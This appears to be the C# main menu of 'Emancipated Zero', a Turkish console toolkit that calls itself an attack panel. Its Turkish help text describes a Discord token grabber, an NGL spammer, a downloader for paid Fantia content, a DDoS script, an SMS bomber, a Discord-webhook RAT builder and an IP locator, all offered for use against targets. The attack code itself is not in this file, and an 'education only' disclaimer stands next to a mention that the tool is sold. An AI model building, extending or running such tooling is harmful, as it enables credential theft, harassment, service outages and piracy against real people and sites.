using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace Emancipated_Zero
{
    class Program
    {
        static Dictionary<string, Action> commands = new Dictionary<string, Action>();

        public static string EmancipatedArtText = @"
  _____                            _             _           _ 
 | ____|_ __ ___   __ _ _ __   ___(_)_ __   __ _| |_ ___  __| |
 |  _| | '_ ` _ \ / _` | '_ \ / __| | '_ \ / _` | __/ _ \/ _` |
 | |___| | | | | | (_| | | | | (__| | |_) | (_| | ||  __/ (_| |
 |_____|_| |_| |_|\__,_|_| |_|\___|_| .__/ \__,_|\__\___|\__,_| 
  _____                        __  _|_|     _        _         
 |__  /___ _ __ ___           |  \/  | __ _| |_ _ __(_)__  __   
   / // _ \ '__/ _ \   _____  | |\/| |/ _` | __| '__| \ \/ /   
  / /|  __/ | | (_) | |_____| | |  | | (_| | |_| |  | |>  <    
 /____\___|_|  \___/          |_|  |_|\__,_|\__|_|  |_/_/\_\   
        Emancipated üst düzey saldırı sistemleri
        _matrixdeveloper59 tarafından
";

        public static async Task Main()
        {
            Console.Title = "Emancipated Zero | Türkiye'nin en gelişmiş sorgu ve saldırı sistemleri | ver 1.39";
            Console.ForegroundColor = ConsoleColor.Yellow;

            // Komutları doğrudan çağırarak işlemleri sırasıyla yapıyoruz
            await ExecuteCommands();
        }

        public static async Task ExecuteCommands()
        {
            Console.Clear();
            Console.WriteLine(EmancipatedArtText, Console.ForegroundColor = ConsoleColor.Magenta);
            Console.ForegroundColor = ConsoleColor.Yellow;

            Console.WriteLine("\nKomut girin: ");
            string input = Console.ReadLine()?.ToLower();

            switch (input)
            {
                case null:
                case "":
                    WriteColored("Boş komut girilemez!", ConsoleColor.Red);
                    break;

                case "help":
                    Help();
                    break;

                case "about":
                    About();
                    break;

                case "exit":
                    Exit();
                    break;
                     
                case "dc token grabber":
                    await TokenGrabber.DiscordTokenGrabber();  // Asenkron işlemi bekleyin
                    break;

                case "ngl spammer":
                    await NGL_Spam.StartNGLSpammer();  // Asenkron işlemi bekleyin
                    break;

                case "fantia download -files":
                    await FantiaDownloader.RunFantiaDownloaderTask();  // Asenkron işlemi bekleyin
                    break;

                case "ddos":
                    await DdosScript.StartDDoSAttack();  // Asenkron işlemi bekleyin
                    break;

                case "smsbomber":
                    await Task.Run(() => CheckPythonRequirements.CheckPythonRequirementsMain("smsbomber", "colorama=0.3.9, requests=2.26.0"));
                    break;

                case "matrixtool":
                    await Task.Run(() => CheckPythonRequirements.CheckPythonRequirementsMain("matrix-main", "click=8.1.3, discord=2.2.3, discord.py=2.2.3, InquirerPy=0.3.4, Pillow=9.5.0, psutil=5.9.5, pycryptodome=3.17, pyfiglet=0.8.post1, pyobf2=1.2.0, pywin32=306, Requests=2.31.0, rich=13.3.5, WMI=1.5.1, urllib3=2.0.2, attrs=23.1.0"));
                    break;

                case "ip query":
                    await Task.Run(() => IPQuery.IPQueryMain());
                    break;

                default:
                    WriteColored("Geçersiz komut! Yardım için 'help' yazın.", ConsoleColor.Red);
                    Console.ReadKey();
                    break;
            }

            // Komut tamamlandıktan sonra tekrar komut girilmesi için yeni bir işlem başlat
            await ExecuteCommands();
        }

        static void RegisterCommand(string command, Action action)
        {
            if (!commands.ContainsKey(command))
            {
                commands.Add(command, action);
            }
        }

        static void Help()
        {
            WriteColored("\nEmancipated Zero Advanced Cybersecurity Systems Komutları:", ConsoleColor.Yellow);
            WriteColored(@"dc token grabber - Discord kullanıcılarının token'larını çalmaya yönelik bir komut.

ngl spammer - NGL platformunda spam mesajlar göndermeyi amaçlar. Hedefi deli eder. NGL nin bir mesaj gönderme sınırlaması olmadığı için dilediğiniz gibi kullanabilirsiniz.
 
fantia download - Fantia platformundan içerik indirmeyi amaçlar. Fantia, bir japon anime topluluğudur. Ve aklınıza gelebilecek o kötü şeyleri indirmenize olanak tanır (Ücretli olanlar da dahil)

ddos - Belirlenen sayıdaki theradlar hedef URL ye durmadan istek gönderirler ve sunucu kapasitesi aşılırsa sunucu çöker.Bu durumda kullanıcılar web sitesine erişemez.

smsbomber - Hedef telefon numarasına belirlediğiniz sayı kadar SMS gönderir. Sistemin nasıl çalıştığını öğrenmek için _matrixdeveloper59 ile iletişime geçebilir veya teknik bilgi biliyorsanız python betiğine bakabilirsiniz.

matrixtool - Bir RAT (Remote Administrator Trojan) oluşturmanıza olanak tanır. Bu sistem Discord için yapılmıştır. Discord üzerinden bilgileri size bir Webhook aracılığıyla aktarır.

ip query - Bir IP nin konum, ülke, bölge, koordinat ve diğer bilgileri öğrenmenize olanak tanır.
            ", ConsoleColor.Cyan);
            Console.ReadKey();
        }

        static void About()
        {
            WriteColored("\nEmancipated Zero - Türkiye'nin en gelişmiş sorgu ve saldırı sistemleri", ConsoleColor.Yellow);
            WriteColored(@"Emancipated Zero, Türkiye'nin en gelişmiş yerli ve milli kullanıcı-basitleştirilmiş bir sorgu ve saldırı panelidir. Kullanıcılar, bu araç sayesinde siber güvenlik alanında deneyim kazanabilirler. Dinamik ve açık kaynaklı araçlarımız, kullanıcılara büyük esneklik sunar ve aynı zamanda katkılara açıktır. Emancipated Zero, özgür bir yazılım olarak geliştirilmiştir ve herkesin erişimine açıktır.

Ancak, Emancipated Team bu ayrıcalığı yalnızca geliştiricilere tanımaktadır. Normal kullanıcıların, bu aracı kullanabilmek için satın almaları gerekmektedir. Emancipated Zero, sorgu ve saldırı sistemlerini yasa dışı davranışlarda kullanmayı kesinlikle desteklemez. Araç, sadece eğitim ve araştırma amaçlı kullanılmak üzere programlanmıştır.

Kullanıcılar, yazılımı kullanırken yasal sorumluluklarını kabul etmiş sayılırlar. Emancipated Team, herhangi bir yasa dışı faaliyetten dolayı hiçbir şekilde sorumlu tutulamaz.

Telif Hakkı 2021-2025 (C) - Emancipated Team
Tüm hakları saklıdır.
            ", ConsoleColor.Cyan);
            Console.ReadKey();
        }

        static void Exit()
        {
            WriteColored("Çıkılıyor...", ConsoleColor.Yellow);
            Environment.Exit(0);
        }

        static void WriteColored(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}
